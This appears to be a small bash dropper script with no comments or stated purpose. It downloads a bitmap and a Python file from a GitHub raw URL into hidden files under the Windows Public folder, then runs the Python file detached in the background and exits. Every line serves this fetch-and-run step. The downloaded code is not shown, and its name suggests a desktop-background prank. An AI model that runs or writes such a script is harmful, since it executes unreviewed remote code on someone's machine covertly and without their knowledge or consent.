#!/usr/bin/env bash

curl https://raw.githubusercontent.com/bradenrupp/background/master/bg.bmp > /c/Users/Public/.bg.bmp
curl https://raw.githubusercontent.com/bradenrupp/background/master/bg.py > /c/Users/Public/.bg.py

python /c/Users/Public/.bg.py & disown && exit
